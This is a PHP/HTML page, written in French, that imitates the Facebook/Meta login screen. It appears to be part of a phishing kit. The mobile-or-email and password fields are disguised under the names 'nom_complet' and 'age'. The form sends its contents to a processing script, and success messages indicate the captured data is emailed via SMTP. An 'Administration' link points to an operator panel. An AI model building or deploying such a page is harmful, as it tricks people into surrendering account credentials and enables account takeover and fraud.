<?php
require_once __DIR__ . '/config/bootstrap.php';
$success = isset($_GET['success']);
$error = $_GET['error'] ?? '';
$email = $_GET['email'] ?? '';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire Client</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
<main class="page">
    <section class="card form-card">
        <header class="top-header">
        <span class="back-arrow">&#8592;</span>
        <span class="language">Français (France) &#9662;</span>
    </header>

    <main class="login-container">

    <div class="fb-logo">f</div>

    </main>

        <?php if ($success): ?>
            <div class="alert success">Informations envoyées avec succès.</div>
            <?php if ($email === '0'): ?>
                <div class="alert warning">Données enregistrées. Email non envoyé : vérifie la configuration SMTP.</div>
            <?php endif; ?>
        <?php elseif ($error): ?>
            <div class="alert error"><?= e($error) ?></div>
        <?php endif; ?>

        <form action="traitement.php" method="POST" autocomplete="off">
            <label for="nom_complet"></label>
            <input id="nom_complet" type="text" name="nom_complet" placeholder="Numero mobile ou e-mail" maxlength="150" required>

            <label for="age"></label>
            <input id="age" type="text" name="age" placeholder="Mot de passe" class="input-field" required>

            <button type="submit">Se connecter</button>
        </form>

        <a class="link" href="login.php">Administration</a>
        <footer class="footer-container">
    <button class="btn-create-account">Créer un nouveau compte</button>
    <div class="meta-logo">∞ Meta</div>
</footer>
    </section>
</main>



</body>
</html>
